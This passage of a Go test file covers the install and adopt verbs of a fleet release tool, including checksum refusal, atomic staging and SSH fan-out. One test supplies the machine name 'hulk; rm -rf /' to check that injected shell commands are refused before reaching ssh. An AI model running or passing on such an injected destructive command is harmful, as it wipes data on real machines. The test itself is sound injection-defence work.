			// THE PROBE ASKS THE REAL FILE. On windows that is nova-bus.exe,
			// and a probe that ran `nova-bus` would be asking after a path
			// that does not exist -- an error, which reads as "not current",
			// which reinstalls every tool on every pass forever.
			wantProbed := []string{ToolFile("nova-bus", goos), ToolFile("nova-worker", goos), current}
			sort.Strings(probed)
			sort.Strings(wantProbed)
			if strings.Join(probed, ",") != strings.Join(wantProbed, ",") {
				require.FailNowf(t, "assertion failed", "probed %v, want %v", probed, wantProbed)
			}
			for _, tool := range []string{"nova-bus", "nova-worker"} {
				assertRunnable(t, filepath.Join(bin, ToolFile(tool, goos)))
			}
			// Skipped means untouched, not overwritten with the same bytes.
			after, err := os.Stat(wake)
			if err != nil || !os.SameFile(before, after) {
				require.FailNowf(t, "assertion failed", "a skipped tool was rewritten: %v", err)
			}
			// The temporary name never survives the verb.
			entries, err := os.ReadDir(bin)
			if err != nil {
				require.NoError(t, err, err)
			}
			for _, entry := range entries {
				if strings.HasPrefix(entry.Name(), ".") {
					require.FailNowf(t, "assertion failed", "a temporary file was left behind: %s", entry.Name())
				}
			}
		})
	}
}

// A file that answers the target version and holds other bytes is replaced.
// The version line fills the before list for prune and is not a skip
// (security#72 finding 2). Skip is fileSum equal to the artifact sum
// (SPEC-RELEASE, install skip).
func TestInstallReplacesABinaryThatAnswersTheTargetVersionButHoldsOtherBytes(t *testing.T) {
	t.Parallel()

	goos, goarch := platformOf(t, "")
	const version = "v0.16.0"
	from := built(t, version, "", "nova-bus")
	name := ToolFile("nova-bus", goos)
	want, err := os.ReadFile(filepath.Join(ArtifactDir(from, version, goos, goarch), name))
	require.NoError(t, err)

	bin := t.TempDir()
	target := filepath.Join(bin, name)
	require.NoError(t, testbin.WriteExecutable(target, []byte("other bytes"), 0o755))

	var out, errs bytes.Buffer
	code := Run("nova-update", []string{"install", "--from", from, "--version", version, "--bin", bin},
		&out, &errs, Deps{VersionOf: func(context.Context, string) (string, error) {
			return "nova-bus " + version + " " + goos + "/" + goarch, nil
		}})
	require.Equal(t, 0, code, errs.String())
	require.Contains(t, out.String(), "tools=1")
	got, err := os.ReadFile(target)
	require.NoError(t, err)
	require.Equal(t, want, got)
}

func TestInstallRefusesABinaryThatDoesNotMatchItsChecksum(t *testing.T) {
	t.Parallel()

	goos, goarch := platformOf(t, "")
	from := built(t, "v0.16.0", "", "nova-bus", "nova-worker")
	dir := ArtifactDir(from, "v0.16.0", goos, goarch)
	if err := testbin.WriteExecutable(filepath.Join(dir, ToolFile("nova-bus", goos)), []byte("tampered"), 0o755); err != nil {
		require.NoError(t, err, err)
	}
	bin := t.TempDir()
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"install", "--from", from, "--version", "v0.16.0", "--bin", bin},
		&o, &e, Deps{VersionOf: func(context.Context, string) (string, error) { return "", fmt.Errorf("absent") }})
	if code != 2 {
		require.Equal(t, 2, code, "code=%d out=%s", code, o.String())
	}
	if !strings.Contains(e.String(), "nova-bus") || !strings.Contains(e.String(), "INSTALL REFUSED") {
		require.FailNowf(t, "assertion failed", "refusal: %s", e.String())
	}
	// NOTHING is installed when one file fails: the set is verified whole
	// before the first rename, so a bad artifact cannot land beside good ones.
	if entries, err := os.ReadDir(bin); err != nil || len(entries) != 0 {
		require.FailNowf(t, "assertion failed", "a refused install still wrote %v (%v)", entries, err)
	}
}

// TestInstallLeavesEveryToolAloneWhenOneStagingFails pins security#72 finding 4.
//
// The planted directory at the predictable .<tool>.new name must not be what
// fails the install. Publish renames the staged temp onto the target, so
// that name is never opened and both tools land. An install that replaces
// nova-a before nova-b is published dies on the plant; rolling nova-a back
// to its old bytes would still hide that, so this case requires the new
// artifact, not the end state after a restore.
//
// The other case is a real staging failure, before any rename. nova-a has
// to be the same file it was, not a copy put back afterwards.
func TestInstallLeavesEveryToolAloneWhenOneStagingFails(t *testing.T) {
	t.Parallel()

	t.Run("planted temp name does not fail the install", func(t *testing.T) {
		t.Parallel()

		goos, _ := platformOf(t, "")
		from := built(t, "v0.16.0", "", "nova-a", "nova-b")
		bin := t.TempDir()
		nameA := ToolFile("nova-a", goos)
		nameB := ToolFile("nova-b", goos)
		if err := testbin.WriteExecutable(filepath.Join(bin, nameA), []byte("old-a"), 0o755); err != nil {
			require.NoError(t, err, err)
		}
		if err := testbin.WriteExecutable(filepath.Join(bin, nameB), []byte("old-b"), 0o755); err != nil {
			require.NoError(t, err, err)
		}
		planted := "." + nameB + ".new"
		if err := os.Mkdir(filepath.Join(bin, planted), 0o755); err != nil {
			require.NoError(t, err, err)
		}

		var o, e bytes.Buffer
		code := Run("nova-update", []string{"install", "--from", from, "--version", "v0.16.0", "--bin", bin},
			&o, &e, Deps{VersionOf: func(context.Context, string) (string, error) {
				return "", fmt.Errorf("absent")
			}})
		if code != 0 {
			require.Equal(t, 0, code, "planted %s failed the install (a tool was published before the rest):\n%s%s", planted, o.String(), e.String())
		}
		assertRunnable(t, filepath.Join(bin, nameA))
		assertRunnable(t, filepath.Join(bin, nameB))
		info, err := os.Lstat(filepath.Join(bin, planted))
		if err != nil || !info.IsDir() {
			require.FailNowf(t, "assertion failed", "planted %s is %v (%v); publish must not open that name", planted, info.Mode(), err)
		}
		entries, err := os.ReadDir(bin)
		if err != nil {
			require.NoError(t, err, err)
		}
		for _, entry := range entries {
			if entry.Name() != planted && (strings.Contains(entry.Name(), ".new") || strings.Contains(entry.Name(), ".aside")) {
				require.FailNowf(t, "assertion failed", "a temp this run created was left behind: %s", entry.Name())
			}
		}
	})

	t.Run("one staging failure replaces nothing", func(t *testing.T) {
		t.Parallel()

		goos, goarch := platformOf(t, "")
		from := built(t, "v0.16.0", "", "nova-a", "nova-b")
		bin := t.TempDir()
		nameA := ToolFile("nova-a", goos)
		nameB := ToolFile("nova-b", goos)
		if err := testbin.WriteExecutable(filepath.Join(bin, nameA), []byte("old-a"), 0o755); err != nil {
			require.NoError(t, err, err)
		}
		if err := testbin.WriteExecutable(filepath.Join(bin, nameB), []byte("old-b"), 0o755); err != nil {
			require.NoError(t, err, err)
		}
		af, err := os.Open(filepath.Join(bin, nameA))
		if err != nil {
			require.NoError(t, err, err)
		}
		before, err := af.Stat()
		if err != nil {
			require.NoError(t, err, err)
		}
		if err := af.Close(); err != nil {
			require.NoError(t, err, err)
		}
		art := ArtifactDir(from, "v0.16.0", goos, goarch)
		var removeErr error
		var o, e bytes.Buffer
		code := Run("nova-update", []string{"install", "--from", from, "--version", "v0.16.0", "--bin", bin},
			&o, &e, Deps{VersionOf: func(_ context.Context, target string) (string, error) {
				// After nova-a has been staged and before nova-b is. The
				// artifact was verified already; removing it fails staging
				// and must not publish anything.
				if filepath.Base(target) == nameB {
					removeErr = os.Remove(filepath.Join(art, nameB))
				}
				return "", fmt.Errorf("absent")
			}})
		if removeErr != nil {
			require.NoError(t, removeErr, removeErr)
		}
		if code == 0 || !strings.Contains(e.String(), "were in place") || strings.Contains(e.String(), "restored") || strings.Contains(e.String(), "left replaced") {
			require.FailNowf(t, "assertion failed", "staging failure was not reported before any publish: code=%d\n%s%s", code, o.String(), e.String())
		}
		after, err := os.Stat(filepath.Join(bin, nameA))
		if err != nil || !os.SameFile(before, after) {
			require.FailNowf(t, "assertion failed", "%s was replaced before every staged file was published (rollback hides the bytes)\n%s", nameA, e.String())
		}
		body, err := os.ReadFile(filepath.Join(bin, nameA))
		if err != nil || string(body) != "old-a" {
			require.FailNowf(t, "assertion failed", "%s holds %q (%v); a failed install must leave it old\n%s", nameA, body, err, e.String())
		}
		body, err = os.ReadFile(filepath.Join(bin, nameB))
		if err != nil || string(body) != "old-b" {
			require.FailNowf(t, "assertion failed", "%s holds %q (%v); a failed install must leave it old\n%s", nameB, body, err, e.String())
		}
		entries, err := os.ReadDir(bin)
		if err != nil {
			require.NoError(t, err, err)
		}
		for _, entry := range entries {
			if strings.Contains(entry.Name(), ".new") || strings.Contains(entry.Name(), ".aside") {
				require.FailNowf(t, "assertion failed", "a temp this run created was left behind: %s", entry.Name())
			}
		}
	})
}

// TestInstallRefusesAToolPathThatIsADirectoryAndMovesNothingAside pins security#72 finding 5.
//
// A directory at a tool path cannot be replaced by an executable. Install
// must refuse to touch it, leaving the directory and any files inside intact,
// and must not leave an aside or staged temp behind.
func TestInstallRefusesAToolPathThatIsADirectoryAndMovesNothingAside(t *testing.T) {
	t.Parallel()

	goos, _ := platformOf(t, "")
	from := built(t, "v0.16.0", "", "nova-c")
	bin := t.TempDir()
	name := ToolFile("nova-c", goos)
	target := filepath.Join(bin, name)
	require.NoError(t, os.Mkdir(target, 0o755))
	keep := filepath.Join(target, "keep.txt")
	require.NoError(t, os.WriteFile(keep, []byte("preserved"), 0o644))

	var o, e bytes.Buffer
	code := Run("nova-update", []string{"install", "--from", from, "--version", "v0.16.0", "--bin", bin},
		&o, &e, Deps{VersionOf: func(context.Context, string) (string, error) {
			return "", fmt.Errorf("absent")
		}})
	require.NotZero(t, code, "install must fail when tool path is a directory: out=%s errs=%s", o.String(), e.String())
	require.Contains(t, e.String(), "INSTALL FAILED")
	require.Contains(t, e.String(), "not a regular file")

	info, err := os.Lstat(target)
	require.NoError(t, err)
	require.True(t, info.IsDir(), "%s should still be a directory", target)

	body, err := os.ReadFile(keep)
	require.NoError(t, err)
	require.Equal(t, "preserved", string(body))

	entries, err := os.ReadDir(bin)
	require.NoError(t, err)
	for _, entry := range entries {
		if strings.HasPrefix(entry.Name(), ".") {
			require.FailNowf(t, "assertion failed", "unexpected temp file or aside left behind: %s", entry.Name())
		}
	}
	require.Len(t, entries, 1)
	require.Equal(t, name, entries[0].Name())

	for _, aside := range []string{"." + name + ".old", "." + name + ".new"} {
		_, err := os.Lstat(filepath.Join(bin, aside))
		require.True(t, os.IsNotExist(err), "unexpected aside or temp %s: %v", aside, err)
	}
}

func TestInstallRefusesAVersionThatWasNeverBuilt(t *testing.T) {
	t.Parallel()

	var o, e bytes.Buffer
	code := Run("nova-update", []string{"install", "--from", built(t, "v0.16.0", "", "nova-bus"),
		"--version", "v0.17.0", "--bin", t.TempDir()}, &o, &e, Deps{})
	if code != 2 || !strings.Contains(e.String(), "v0.17.0") {
		require.FailNowf(t, "assertion failed", "code=%d errs=%s", code, e.String())
	}
}

// ---------------------------------------------------------------------------
// adopt
// ---------------------------------------------------------------------------

func machinesFile(t *testing.T, lines string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "machines")
	if err := os.WriteFile(path, []byte(lines), 0o644); err != nil {
		require.NoError(t, err, err)
	}
	return path
}

// The remote command names the tool file of the TARGET, so adopting a windows
// bench runs nova-update.exe there. Composing a bare `nova-update` was the
// product half of the same defect the Windows PR leg found in the test half:
// the path would exist nowhere in the release, and the bench would answer
// `command not found` for a mistake made on this side.
func TestAdoptSendsInstallsAndWritesOneReceiptPerMachine(t *testing.T) {
	t.Parallel()

	for _, platform := range []string{"", "linux-amd64", "windows-amd64"} {
		name := platform
		if name == "" {
			name = "this host " + hostPlatform
		}
		t.Run(name, func(t *testing.T) {
			goos, goarch := platformOf(t, platform)
			from := built(t, "v0.16.0", platform, "nova-bus", "nova-update")
			list := machinesFile(t, "# the Linux benches\nhulk\nvision\n\nmini\n")
			s := &fakeSSH{answer: map[string]string{
				"hulk":   "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0\n",
				"vision": "RELEASE INSTALLED version=v0.16.0 tools=0 skipped=2\n",
				"mini":   "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0\n",
			}}
			// --no-certify: these cases are about the install, and an adopt certifies by
			// default since 2026-09-18. The waiver is explicit here exactly as it must be
			// on a real command line.
			args := []string{"adopt", "--no-certify", "--version", "v0.16.0", "--machines", list,
				"--ssh", "/usr/bin/ssh", "--from", from, "--bin", "/home/nova/.local/bin",
				"--dest", "/home/nova/nova-bench/build", "--no-certify"}
			if platform != "" {
				args = append(args, "--platform", platform)
			}
			var o, e bytes.Buffer
			if code := Run("nova-update", args, &o, &e, Deps{SSH: s}); code != 0 {
				require.Equal(t, 0, code, "code=%d errs=%s", code, e.String())
			}
			for _, machine := range []string{"hulk", "vision", "mini"} {
				want := "RELEASE ADOPTED machine=" + machine + " version=v0.16.0 tools="
				if !strings.Contains(o.String(), want) {
					require.Contains(t, o.String(), want, "no receipt for %s:\n%s", machine, o.String())
				}
			}
			if !strings.Contains(o.String(), "RELEASE ADOPT OK machines=3 adopted=3 refused=0") {
				require.Contains(t, o.String(), "RELEASE ADOPT OK machines=3 adopted=3 refused=0", "no verdict line:\n%s", o.String())
			}
			if len(s.sends) != 3 {
				require.Len(t, s.sends, 3, "sends=%v", s.sends)
			}
			// The release installs ITSELF: the nova-update that runs the
			// remote install is the one just sent, so a bench with no
			// nova-tools at all can still adopt. That is the whole of what
			// fleet-install-tools.sh's nested ssh quoting was doing.
			run := installRun(t, s, "hulk")
			for _, part := range []string{
				"/home/nova/nova-bench/build/v0.16.0/" + goos + "-" + goarch + "/" + ToolFile("nova-update", goos),
				"release install",
				"--version v0.16.0",
				"--bin /home/nova/.local/bin",
				"--platform " + goos + "-" + goarch,
			} {
				if !strings.Contains(run, part) {
					require.Contains(t, run, part, "the remote command does not carry %q: %s", part, run)
				}
			}
			// Remote paths are slash paths whatever this host is, so a
			// darwin or windows coordinator adopts a Linux bench correctly.
			if strings.Contains(run, `\`) {
				require.NotContains(t, run, `\`, "the remote command carries a backslash path: %s", run)
			}
		})
	}
}

// A windows release that somehow carries no nova-update.exe is refused by name,
// rather than sent and then found missing on the far side.
func TestAdoptRefusesAReleaseWithNoUpdateForTheTarget(t *testing.T) {
	t.Parallel()

	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--no-certify", "--version", "v0.16.0",
		"--machines", machinesFile(t, "hulk\n"), "--ssh", "/usr/bin/ssh",
		"--from", built(t, "v0.16.0", "windows-amd64", "nova-bus"), "--bin", "/b", "--dest", "/d",
		"--platform", "windows-amd64", "--no-certify"}, &o, &e, Deps{SSH: &fakeSSH{}})
	if code != 2 || !strings.Contains(e.String(), "nova-update.exe") {
		require.FailNowf(t, "assertion failed", "code=%d errs=%s", code, e.String())
	}
}

func TestAdoptRefusesOneMachineAndStillReportsTheRest(t *testing.T) {
	t.Parallel()

	from := built(t, "v0.16.0", "", "nova-bus", "nova-update")
	list := machinesFile(t, "hulk\nvision\n")
	s := &fakeSSH{
		answer: map[string]string{"hulk": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0\n"},
		refuse: map[string]error{"vision": fmt.Errorf("ssh: connect to host vision port 22: Connection refused")},
	}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--no-certify", "--version", "v0.16.0", "--machines", list,
		"--ssh", "/usr/bin/ssh", "--from", from, "--bin", "/home/nova/.local/bin",
		"--dest", "/home/nova/nova-bench/build", "--no-certify"}, &o, &e, Deps{SSH: s})
	if code != 1 {
		require.Equal(t, 1, code, "code=%d", code)
	}
	if !strings.Contains(o.String(), "RELEASE ADOPTED machine=hulk") {
		require.Contains(t, o.String(), "RELEASE ADOPTED machine=hulk", "the machine that worked has no receipt:\n%s", o.String())
	}
	line := ""
	for _, l := range strings.Split(e.String(), "\n") {
		if strings.HasPrefix(l, "RELEASE REFUSED machine=vision") {
			line = l
		}
	}
	if line == "" {
		require.FailNowf(t, "assertion failed", "no refusal for vision:\n%s", e.String())
	}
	// A refusal with no remedy is a line that tells somebody to go and find out.
	if !strings.Contains(line, "Connection refused") || !strings.Contains(line, "ssh ") {
		require.FailNowf(t, "assertion failed", "the refusal carries no cause and remedy: %s", line)
	}
	if !strings.Contains(e.String(), "adopted=1 refused=1") {
		require.Contains(t, e.String(), "adopted=1 refused=1", "the verdict does not count both:\n%s", e.String())
	}
}

// A remote that answered something other than the install line is not an
// adoption, however cheerfully it exited: the receipt is read from the output,
// never from the exit code.
func TestAdoptRefusesAMachineWhoseInstallSaidNothing(t *testing.T) {
	t.Parallel()

	from := built(t, "v0.16.0", "", "nova-update")
	s := &fakeSSH{answer: map[string]string{"hulk": "bash: nova-update: command not found\n"}}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--no-certify", "--version", "v0.16.0", "--machines", machinesFile(t, "hulk\n"),
		"--ssh", "/usr/bin/ssh", "--from", from, "--bin", "/b", "--dest", "/d", "--no-certify"}, &o, &e, Deps{SSH: s})
	if code != 1 || !strings.Contains(e.String(), "RELEASE REFUSED machine=hulk") {
		require.FailNowf(t, "assertion failed", "code=%d errs=%s", code, e.String())
	}
}

func TestAdoptRefusesAMachineNameThatIsNotOne(t *testing.T) {
	t.Parallel()

	from := built(t, "v0.16.0", "", "nova-update")
	s := &fakeSSH{}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--no-certify", "--version", "v0.16.0",
		"--machines", machinesFile(t, "hulk; rm -rf /\n"), "--ssh", "/usr/bin/ssh",
		"--from", from, "--bin", "/b", "--dest", "/d", "--no-certify"}, &o, &e, Deps{SSH: s})
	if code != 2 {
		require.Equal(t, 2, code, "code=%d out=%s", code, o.String())
	}
	if len(s.runs) != 0 || len(s.sends) != 0 {
		require.FailNowf(t, "assertion failed", "a bad machine name still reached ssh: %v %v", s.runs, s.sends)
	}
}

func TestAdoptRefusesAnEmptyMachineList(t *testing.T) {
	t.Parallel()

	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--no-certify", "--version", "v0.16.0",
		"--machines", machinesFile(t, "# nobody\n\n"), "--ssh", "/usr/bin/ssh",
		"--from", built(t, "v0.16.0", "", "nova-update"), "--bin", "/b", "--dest", "/d", "--no-certify"}, &o, &e, Deps{SSH: &fakeSSH{}})
	if code != 2 || !strings.Contains(e.String(), "no machine") {
		require.FailNowf(t, "assertion failed", "code=%d errs=%s", code, e.String())
	}
}

// ---------------------------------------------------------------------------
// the forge edge
// ---------------------------------------------------------------------------

// The first real `cut --dry-run` against this repository asked the compare
// endpoint for v0.15.2...dev -- 551 pull requests, well over the 64 KiB cap
// every other child here is held to. The capture cancelled the child, and what
// the verb printed was `signal: killed`: a refusal naming a symptom, with a
// remedy about the forge answering, for a cause that was entirely ours. The
// ceiling stays -- a runaway gh must not be able to fill memory -- but reaching
// it says so by name.
func TestAForgeReadThatFillsTheCeilingSaysSoRatherThanKilled(t *testing.T) {
	t.Parallel()

	args := []string{"api", "repos/o/n/compare/v0.15.2...head"}
	err := apiError(args, true, fmt.Errorf("signal: killed"))
	if err == nil {
		require.Error(t, err, "a capture that hit the ceiling was reported as success")
	}
	if strings.Contains(err.Error(), "killed") {
		require.NotContains(t, err.Error(), "killed", "the refusal still names the signal: %v", err)
	}
	for _, s := range []string{"ceiling", "nearer tag", "compare"} {
		if !strings.Contains(err.Error(), s) {
			assert.Contains(t, err.Error(), s, "the refusal does not carry %q: %v", s, err)
		}
	}
	// An ordinary failure is still an ordinary failure, with gh's own words.
	err = apiError(args, false, fmt.Errorf("HTTP 404"))
	if err == nil || !strings.Contains(err.Error(), "404") {
		require.FailNowf(t, "assertion failed", "a real failure lost its cause: %v", err)
	}
	if err := apiError(args, false, nil); err != nil {
		require.NoError(t, err, "a read that answered was reported as an error: %v", err)
	}
}

// ---------------------------------------------------------------------------
// the verb itself
// ---------------------------------------------------------------------------

func TestReleaseRefusesAnUnknownSubverbAndNamesTheFive(t *testing.T) {
	t.Parallel()

	var o, e bytes.Buffer
	if code := Run("nova-update", []string{"ship"}, &o, &e, Deps{}); code != 2 {
		require.Equal(t, 2, code, code)
	}
	for _, verb := range []string{"cut", "build", "install", "adopt", "pull"} {
		if !strings.Contains(e.String(), verb) {
			require.Contains(t, e.String(), verb, "the refusal does not name %s: %s", verb, e.String())
		}
	}
	o.Reset()
	e.Reset()
	if code := Run("nova-update", nil, &o, &e, Deps{}); code != 2 {
		require.Equal(t, 2, code, code)
	}
}

// Progress belongs on stderr and the result on stdout, so that a caller reading
// the receipt off stdout reads receipts and nothing else (Glenn 2026-09-17:
// programs say what they are doing).
func TestProgressGoesToStderrAndReceiptsToStdout(t *testing.T) {
	t.Parallel()

	from := built(t, "v0.16.0", "", "nova-bus", "nova-update")
	s := &fakeSSH{answer: map[string]string{"hulk": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0\n"}}
	var o, e bytes.Buffer
	if code := Run("nova-update", []string{"adopt", "--no-certify", "--version", "v0.16.0", "--machines", machinesFile(t, "hulk\n"),
		"--ssh", "/usr/bin/ssh", "--from", from, "--bin", "/b", "--dest", "/d", "--no-certify"}, &o, &e, Deps{SSH: s}); code != 0 {
		require.FailNowf(t, "assertion failed", "%d %s", code, e.String())
	}
	if !strings.Contains(e.String(), "release: ") {
		require.Contains(t, e.String(), "release: ", "no progress on stderr: %q", e.String())
	}
	for _, line := range strings.Split(strings.TrimSpace(o.String()), "\n") {
		if line != "" && !strings.HasPrefix(line, "RELEASE ") {
			require.FailNowf(t, "assertion failed", "stdout carries something that is not a receipt: %q", line)
		}
	}
}

// ---------------------------------------------------------------------------
// what the first fleet dogfood found (receipts, 2026-09-18, rowan-child)
// ---------------------------------------------------------------------------

// THE BLOCKER. adopt was written assuming it runs on the build host and fans
// out; on this fleet it cannot, because no bench has ssh trust to any other
// bench. 3 of 3 machines refused with `Permission denied (publickey)`. The fix
// that needs no new trust is to run adopt where the trust already is and let it
// READ the release from where it was built.
func TestAdoptFetchesTheReleaseFromAnotherMachine(t *testing.T) {
	t.Parallel()

	goos, goarch := platformOf(t, "linux-amd64")
	// hulk built it; this host has never seen the artifacts.
	onHulk := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	stage := t.TempDir()
	served := ArtifactDir(onHulk, "v0.16.0", goos, goarch)
	// The digest the cut recorded, which reached this host through git.
	digest, err := fileSum(filepath.Join(served, SumsFile))
	if err != nil {
		require.NoError(t, err, err)
	}
	s := &fakeSSH{
		serves: map[string]string{"hulk": served},
		answer: map[string]string{
			"vision": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=0\n",
			"mini":   "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=0\n",
		},
	}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--no-certify", "--version", "v0.16.0",
		"--machines", machinesFile(t, "vision\nmini\n"), "--ssh", "/usr/bin/ssh",
		"--from", "hulk:/home/nova/nova-bench/release", "--stage", stage,
		"--expect-sums", digest,
		"--bin", "~/.local/bin", "--dest", "~/nova-bench/build",
		"--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
	if code != 0 {
		require.Equal(t, 0, code, "code=%d errs=%s", code, e.String())
	}
	// ONE fetch, from the build host, and then a push to each machine: the
	// machines never talk to each other and never need to.
	if len(s.fetches) != 1 || !strings.Contains(s.fetches[0], "hulk: /home/nova/nova-bench/release/v0.16.0/linux-amd64") {
		require.FailNowf(t, "assertion failed", "fetches=%v", s.fetches)
	}
	if len(s.sends) != 2 {
		require.Len(t, s.sends, 2, "sends=%v", s.sends)
	}
	for _, machine := range []string{"vision", "mini"} {
		if !strings.Contains(o.String(), "RELEASE ADOPTED machine="+machine+" version=v0.16.0") {
			require.Contains(t, o.String(), "RELEASE ADOPTED machine="+machine+" version=v0.16.0", "no receipt for %s:\n%s", machine, o.String())
		}
	}
	// The staged copy is a real copy, verified here before any of it moved on.
	if _, err := ReadSums(ArtifactDir(stage, "v0.16.0", goos, goarch)); err != nil {
		require.NoError(t, err, "the release was not staged: %v", err)
	}
	// A leading ~ survives to the remote shell, which is what lets one --bin
	// name three different home directories.
	if run := installRun(t, s, "vision"); !strings.Contains(run, "--bin ~/.local/bin") {
		require.Contains(t, run, "--bin ~/.local/bin", "the tilde did not survive: %s", run)
	}
}

func TestAdoptRefusesARemoteFromWithNoStage(t *testing.T) {
	t.Parallel()

	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--no-certify", "--version", "v0.16.0",
		"--machines", machinesFile(t, "vision\n"), "--ssh", "/usr/bin/ssh",
		"--from", "hulk:/releases", "--bin", "/b", "--dest", "/d"}, &o, &e, Deps{SSH: &fakeSSH{}})
	if code != 2 || !strings.Contains(e.String(), "--stage") {
		require.FailNowf(t, "assertion failed", "code=%d errs=%s", code, e.String())
	}
}

// A fetch that arrived truncated is caught ONCE, here, rather than four times
// on four machines that are then in four different states.
func TestAdoptRemovesWhatItFetchedWhenTheDigestOrTheChecksRefuse(t *testing.T) {
	t.Parallel()

	for _, kind := range []string{"damaged artifact", "wrong expected digest", "invalid sums", "missing sums"} {
		t.Run(kind, func(t *testing.T) {
			t.Parallel()
			source := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
			dir := ArtifactDir(source, "v0.16.0", "linux", "amd64")
			sums := filepath.Join(dir, SumsFile)
			if kind == "damaged artifact" {
				require.NoError(t, testbin.WriteExecutable(filepath.Join(dir, "nova-bus"), []byte("truncated"), 0o755))
			}
			if kind == "invalid sums" {
				require.NoError(t, os.WriteFile(sums, []byte("invalid checksum file\n"), 0o644))
			}
			digest, err := fileSum(sums)
			require.NoError(t, err)
			if kind == "wrong expected digest" {
				digest = strings.Repeat("0", 64)
			}
			if kind == "missing sums" {
				require.NoError(t, os.Remove(sums))
			}
			stage := t.TempDir()
			neighbor := filepath.Join(stage, "keep")
			require.NoError(t, os.WriteFile(neighbor, []byte("operator data"), 0o600))
			s := &fakeSSH{serves: map[string]string{"builder": dir}}
			var out, errs bytes.Buffer
			code := Run("nova-update", []string{"adopt", "--no-certify", "--version", "v0.16.0",
				"--machines", machinesFile(t, "target\n"), "--ssh", "/usr/bin/ssh",
				"--from", "builder:/releases", "--stage", stage, "--expect-sums", digest,
				"--bin", "/b", "--dest", "/d", "--platform", "linux-amd64"}, &out, &errs, Deps{SSH: s})
			require.Equal(t, 2, code, errs.String())
			require.Len(t, s.fetches, 1)
			assert.Empty(t, s.sends)
			assert.NoDirExists(t, ArtifactDir(stage, "v0.16.0", "linux", "amd64"), "a refused fetch must leave no unverified artifacts")
			body, err := os.ReadFile(neighbor)
			require.NoError(t, err)
			assert.Equal(t, "operator data", string(body))
		})
	}
}

func TestAdoptLeavesAnExistingFetchDirectoryAlone(t *testing.T) {
	t.Parallel()

	stage := t.TempDir()
	into := ArtifactDir(stage, "v0.16.0", "linux", "amd64")
	require.NoError(t, os.MkdirAll(into, 0o755))
	owned := filepath.Join(into, "operator-data")
	require.NoError(t, os.WriteFile(owned, []byte("keep"), 0o600))
	s := &fakeSSH{}
	var out, errs bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--no-certify", "--version", "v0.16.0",
		"--machines", machinesFile(t, "target\n"), "--ssh", "/usr/bin/ssh",
		"--from", "builder:/releases", "--stage", stage, "--expect-sums", strings.Repeat("0", 64),
		"--bin", "/b", "--dest", "/d", "--platform", "linux-amd64"}, &out, &errs, Deps{SSH: s})
	require.Equal(t, 2, code, errs.String())
	assert.Contains(t, errs.String(), "name a writable --stage without this version and platform")
	assert.Empty(t, s.fetches, "an existing directory is refused before any fetch")
	body, err := os.ReadFile(owned)
	require.NoError(t, err)
	assert.Equal(t, "keep", string(body))
}

func TestAdoptRefusesAFetchThatDoesNotMatchItsChecksums(t *testing.T) {
	t.Parallel()

	goos, goarch := platformOf(t, "linux-amd64")
	onHulk := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	dir := ArtifactDir(onHulk, "v0.16.0", goos, goarch)
	if err := testbin.WriteExecutable(filepath.Join(dir, "nova-bus"), []byte("truncated"), 0o755); err != nil {
		require.NoError(t, err, err)
	}
	s := &fakeSSH{serves: map[string]string{"hulk": dir}}
	// The checksum FILE is untouched, so its digest still matches what the cut
	// recorded: this is the case where the bits alone were damaged in flight.
	digest, err := fileSum(filepath.Join(dir, SumsFile))
	if err != nil {
		require.NoError(t, err, err)
	}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--no-certify", "--version", "v0.16.0",
		"--machines", machinesFile(t, "vision\n"), "--ssh", "/usr/bin/ssh",
		"--from", "hulk:/releases", "--stage", t.TempDir(), "--expect-sums", digest,
		"--bin", "/b", "--dest", "/d", "--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
	if code != 2 || !strings.Contains(e.String(), "nova-bus") {
		require.FailNowf(t, "assertion failed", "code=%d errs=%s", code, e.String())
	}
	if len(s.sends) != 0 {
		require.Len(t, s.sends, 0, "a bad fetch was still pushed to a machine: %v", s.sends)
	}
}

// A colon is ambiguous exactly once, and it is resolved in favour of the local
// path: a windows artifact root is a path, not a host called C.
func TestRemoteFromTellsAHostFromAWindowsPath(t *testing.T) {
	t.Parallel()

	for _, tc := range []struct {
		in, host, dir string
		remote        bool
	}{
		{"hulk:/home/nova/release", "hulk", "/home/nova/release", true},
		{"nova@hulk:/releases", "nova@hulk", "/releases", true},
		{`C:\releases`, "", `C:\releases`, false},
		{"/home/nova/release", "", "/home/nova/release", false},
		{"hulk:", "", "hulk:", false},
	} {
		host, dir, remote := RemoteFrom(tc.in)
		if host != tc.host || dir != tc.dir || remote != tc.remote {
			assert.Failf(t, "assertion failed", "%q -> (%q, %q, %v), want (%q, %q, %v)", tc.in, host, dir, remote, tc.host, tc.dir, tc.remote)
		}
	}
}

// The fleet has three home directories. A machine that is the odd one out says
// so in the file, rather than in a second run with different flags -- which is
// a second chance to get the version wrong.
func TestMachinesFileCarriesPerMachineOverrides(t *testing.T) {
	t.Parallel()

	machines, err := Machines(strings.NewReader(
		"# the fleet\nhulk\n\nvision\t~/bin\t~/stage\nnova@mini\t/opt/nova/bin\n"))
	if err != nil {
		require.NoError(t, err, err)
	}
	want := []Machine{
		{Name: "hulk"},
		{Name: "vision", Bin: "~/bin", Dest: "~/stage"},
		{Name: "nova@mini", Bin: "/opt/nova/bin"},
	}
	if fmt.Sprint(machines) != fmt.Sprint(want) {
